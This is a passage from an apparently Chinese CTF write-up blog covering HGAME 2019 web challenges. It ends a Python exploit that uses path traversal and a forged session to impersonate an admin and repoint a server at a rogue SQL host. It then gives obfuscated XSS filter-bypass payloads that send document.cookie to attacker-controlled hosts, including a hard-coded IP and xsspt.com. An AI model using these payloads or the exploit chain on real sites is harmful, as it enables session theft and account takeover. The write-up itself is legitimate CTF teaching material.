<span class=n>r</span><span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>registerURL</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>registerData</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] register &#34;</span><span class=o>+</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>

<span class=c1># login</span>
<span class=n>loginData</span><span class=o>=</span><span class=p>{</span>    <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;ii5am3&#34;</span><span class=p>,</span>    <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;123456&#34;</span><span class=p>,}</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>loginURL</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>loginData</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;[+] login &#34;</span><span class=o>+</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
<span class=n>sessionID</span><span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>_cookies</span><span class=o>.</span><span class=n>_cookies</span><span class=p>[</span><span class=n>ip</span><span class=p>][</span><span class=s2>&#34;/&#34;</span><span class=p>][</span><span class=s2>&#34;PHPSESSID&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>value</span>
<span class=nb>print</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;[+] sessionID is &#34;</span><span class=o>+</span> <span class=n>sessionID</span><span class=p>)</span>

<span class=c1># 上传session，伪造cookie</span>
<span class=n>newSession</span> <span class=o>=</span> <span class=n>sessionID</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>]</span><span class=o>+</span><span class=s2>&#34;5am3&#34;</span>
<span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;../../tmp/</span><span class=si>%s</span><span class=s2>/</span><span class=si>%s</span><span class=s2>/</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span><span class=p>(</span><span class=n>sessionID</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>sessionID</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=n>newSession</span><span class=p>)</span>
<span class=n>sessionFiles</span><span class=o>=</span><span class=p>{</span>    <span class=s2>&#34;uploadname&#34;</span> <span class=p>:</span> <span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>attackCookie</span><span class=p>)}</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>userinfoURL</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>sessionFiles</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;[+] newSessionID is &#34;</span><span class=o>+</span> <span class=n>newSession</span><span class=p>)</span>

<span class=c1># 修改头像文件链接。</span>
<span class=n>sessionFiles</span><span class=o>=</span><span class=p>{</span>    <span class=s2>&#34;uploadname&#34;</span> <span class=p>:</span> <span class=p>(</span><span class=s2>&#34;../../conf/app.conf&#34;</span><span class=p>,</span> <span class=s2>&#34;12345&#34;</span><span class=p>)}</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>userinfoURL</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>sessionFiles</span><span class=p>)</span>

<span class=c1># 新建一个请求，伪造admin进行删除用户</span>
<span class=n>headers</span><span class=o>=</span><span class=p>{</span>    <span class=s2>&#34;Cookie&#34;</span><span class=p>:</span><span class=s2>&#34;PHPSESSID=&#34;</span><span class=o>+</span><span class=n>newSession</span><span class=p>}</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>deleteUserURL</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>

<span class=c1># 重新安装环境，将其指向我们的恶意sql服务器。</span>
<span class=n>installData</span> <span class=o>=</span> <span class=p>{</span>
    <span class=s2>&#34;host&#34;</span><span class=p>:</span><span class=s2>&#34;your_ip&#34;</span><span class=p>,</span>
    <span class=s2>&#34;port&#34;</span><span class=p>:</span><span class=s2>&#34;your_port&#34;</span><span class=p>,</span>
    <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;hgame&#34;</span><span class=p>,</span>    <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;hgame&#34;</span><span class=p>,</span>    <span class=s2>&#34;database&#34;</span><span class=p>:</span><span class=s2>&#34;hgame&#34;</span><span class=p>}</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>installURl</span><span class=p>,</span><span class=n>installData</span><span class=p>)</span>

<span class=c1># 再次登录，使其再来一次请求。</span>
<span class=n>loginData</span><span class=o>=</span><span class=p>{</span>    <span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;ii5am3&#34;</span><span class=p>,</span>    <span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;123456&#34;</span><span class=p>,}</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>loginURL</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>loginData</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;[+] login &#34;</span><span class=o>+</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</code></pre></div><p>读取 flag</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004373.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004373.jpg loading=lazy>
</a>
</figure></p>
<h4 id=happyxss>HappyXSS</h4>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>onerror
&#34;
&amp;
svg
onload
onerror
&#39;
</code></pre></div><p>随手<code>fuzz</code>了一下，发现以上关键字会被替换为<code>Happy !</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>marquee</span> <span class=na>onstart</span><span class=o>=</span><span class=s>alert(1)</span><span class=p>&gt;</span>

<span class=p>&lt;</span><span class=nt>marquee</span> <span class=na>onstart</span><span class=o>=</span><span class=s>eval(atob(&#39;YWxlcnQoMSk=&#39;))</span><span class=p>&gt;</span>

<span class=p>&lt;</span><span class=nt>marquee</span> <span class=na>onstart</span><span class=o>=</span><span class=s>eval(atob(&#39;some</span> <span class=na>base64</span> <span class=na>code</span><span class=err>&#39;))</span><span class=p>&gt;</span>
</code></pre></div><p>用<code>&lt;marquee></code>虽然可以绕，但是<code>Chrome</code>不支持这个标签了，可能这题也用的是<code>Chromeless</code>，然后发现还有<code>CSP</code>策略。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
<span class=n>Date</span><span class=o>:</span> <span class=l>Fri, 22 Feb 2019 10:32:21 GMT</span>
<span class=n>Server</span><span class=o>:</span> <span class=l>Apache/2.4.29 (Ubuntu)</span>
<span class=n>Expires</span><span class=o>:</span> <span class=l>Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-store, no-cache, must-revalidate</span>
<span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
<span class=n>Content-Security-Policy</span><span class=o>:</span> <span class=l>default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; style-src *</span>
<span class=n>X-XSS-Protection</span><span class=o>:</span> <span class=l>0</span>
<span class=n>Vary</span><span class=o>:</span> <span class=l>Accept-Encoding</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>1353</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=UTF-8</span>
</code></pre></div><p>最后我用<code>&lt;body onpageshow</code>进行了绕过</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>body</span> <span class=na>onpageshow</span><span class=o>=</span><span class=s>eval(atob(&#39;ZnJhbWU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZnJhbWUpOwpzY3JpcHQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmM9Jy8veHNzcHQuY29tL0d2eE5Qbic7CndpbmRvdy5mcmFtZXNbMF0uZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOw==&#39;))</span><span class=p>&gt;</span>
</code></pre></div><p>Base64 内容：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>frame</span><span class=o>=</span><span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;iframe&#34;</span><span class=p>);</span>
<span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>frame</span><span class=p>);</span>
<span class=nx>script</span><span class=o>=</span><span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;script&#39;</span><span class=p>);</span>
<span class=nx>script</span><span class=p>.</span><span class=nx>src</span><span class=o>=</span><span class=s1>&#39;//xsspt.com/GvxNPn&#39;</span><span class=p>;</span>
<span class=nb>window</span><span class=p>.</span><span class=nx>frames</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nb>document</span><span class=p>.</span><span class=nx>head</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>script</span><span class=p>);</span>
</code></pre></div><p>但是以上不能绕<code>CSP</code>策略，可以用<code>window.location</code>绕过</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>body</span> <span class=na>onpageshow</span><span class=o>=</span><span class=s>eval(atob(&#39;d2luZG93LmxvY2F0aW9uPSJodHRwOi8veW91cl9pcDpwb3J0P2M9Iitkb2N1bWVudC5jb29raWU7&#39;))</span><span class=p>&gt;</span>
</code></pre></div><p>base64 内容：</p>
<pre tabindex=0><code class=language-script data-lang=script>window.location=&quot;http://your_ip:port?c=&quot;+document.cookie;
</code></pre><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002591.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002591.jpg loading=lazy>
</a>
</figure></p>
<p>再给几个其他师傅绕过的 payload :</p>
<p>利用<code>window.open</code>，不过用的是<code>&lt;script ></code>绕过关键字检测</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;http://149.248.6.227:1150/XSS.php?cookie=&#39;</span><span class=o>+</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>

<span class=p>&lt;</span><span class=nt>script</span> <span class=p>&gt;</span><span class=nb>eval</span><span class=p>(</span><span class=nb>String</span><span class=p>.</span><span class=nx>fromCharCode</span><span class=p>(</span><span class=mi>119</span><span class=p>,</span><span class=mi>105</span><span class=p>,</span><span class=mi>110</span><span class=p>,</span><span class=mi>100</span><span class=p>,</span><span class=mi>111</span><span class=p>,</span><span class=mi>119</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>111</span><span class=p>,</span><span class=mi>112</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>110</span><span class=p>,</span><span class=mi>40</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>104</span><span class=p>,</span><span class=mi>116</span><span class=p>,</span><span class=mi>116</span><span class=p>,</span><span class=mi>112</span><span class=p>,</span><span class=mi>58</span><span class=p>,</span><span class=mi>47</span><span class=p>,</span><span class=mi>47</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>52</span><span class=p>,</span><span class=mi>57</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>52</span><span class=p>,</span><span class=mi>56</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>54</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>58</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>53</span><span class=p>,</span><span class=mi>48</span><span class=p>,</span><span class=mi>47</span><span class=p>,</span><span class=mi>88</span><span class=p>,</span><span class=mi>83</span><span class=p>,</span><span class=mi>83</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>112</span><span class=p>,</span><span class=mi>104</span><span class=p>,</span><span class=mi>112</span><span class=p>,</span><span class=mi>63</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>111</span><span class=p>,</span><span class=mi>111</span><span class=p>,</span><span class=mi>107</span><span class=p>,</span><span class=mi>105</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>61</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>43</span><span class=p>,</span><span class=mi>100</span><span class=p>,</span><span class=mi>111</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>117</span><span class=p>,</span><span class=mi>109</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>110</span><span class=p>,</span><span class=mi>116</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>111</span><span class=p>,</span><span class=mi>111</span><span class=p>,</span><span class=mi>107</span><span class=p>,</span><span class=mi>105</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>41</span><span class=p>))&lt;/</span><span class=nt>script</span> <span class=p>&gt;</span>
</code></pre></div><p>还有的用<code>&lt;input onfous</code>绕过</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>input</span> <span class=na>onfocus</span><span class=o>=</span><span class=s>javascript:eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,50,53,48,48,48,47,63,115,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59));</span> <span class=na>autofocus</span><span class=p>&gt;</span>
</code></pre></div>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/CTF/>CTF</a>
<a href=/tags/wp/>wp</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2020/04/24/Plaid-CTF-2020-Web-2/>
<div class=article-details>
<h2 class=article-title>Plaid CTF 2020 Catalog</h2>
</div>
</a>
</article>
<article>
<a href=/2020/04/20/Plaid-CTF-2020-Web-1/>
<div class=article-details>
<h2 class=article-title>Plaid CTF 2020 Contrived Web Problem Write Up</h2>
</div>
</a>
</article>
<article>
<a href=/2019/06/04/2019qwb/>
<div class=article-details>
<h2 class=article-title>2019强网杯部分Web wp</h2>
</div>
</a>
</article>
<article>
<a href=/2019/05/30/2019iscc/>
<div class=article-details>
<h2 class=article-title>2019 ISCC Web wp</h2>
</div>
</a>
</article>
<article>
<a href=/2019/05/09/2019ciscn-RefSpace/>
<div class=article-details>
<h2 class=article-title>2019 CISCN RefSpace</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2022 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#week-1>Week 1</a>
<ol>
<li><a href=#web>Web</a>
<ol>
<li><a href=#谁吃了我的-flag>谁吃了我的 flag</a></li>
<li><a href=#换头大作战>换头大作战</a></li>
<li><a href=#very-easy-web>very easy web</a></li>
<li><a href=#can-u-find-me>can u find me</a></li>
</ol>
</li>
</ol>
</li>
<li><a href=#week-2>Week 2</a>
<ol>
<li><a href=#web-1>Web</a>
<ol>
<li><a href=#easy_php>easy_php</a></li>
<li><a href=#php-trick>php trick</a></li>
<li><a href=#php-is-the-best-language>PHP Is The Best Language</a></li>
<li><a href=#baby_spider>Baby_Spider</a></li>
<li><a href=#math-有趣>Math 有趣</a></li>
</ol>
</li>
</ol>
</li>
<li><a href=#week-3>Week 3</a>
<ol>
<li><a href=#web-2>Web</a>
<ol>
<li><a href=#神奇的-md5>神奇的 md5</a></li>
<li><a href=#sqli-1>sqli-1</a></li>
<li><a href=#sqli-2>sqli-2</a></li>
<li><a href=#基础渗透>基础渗透</a></li>
<li><a href=#babyxss>BabyXSS</a></li>
</ol>
</li>
</ol>
</li>
<li><a href=#week-4>Week 4</a>
<ol>
<li><a href=#web-3>Web</a>
<ol>
<li><a href=#happypython>happyPython</a></li>
<li><a href=#happyphp>happyPHP</a></li>
<li><a href=#happyjava>happyJava</a></li>
<li><a href=#happygo>happyGo</a></li>
<li><a href=#happyxss>HappyXSS</a></li>
</ol>
</li>
</ol>
</li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>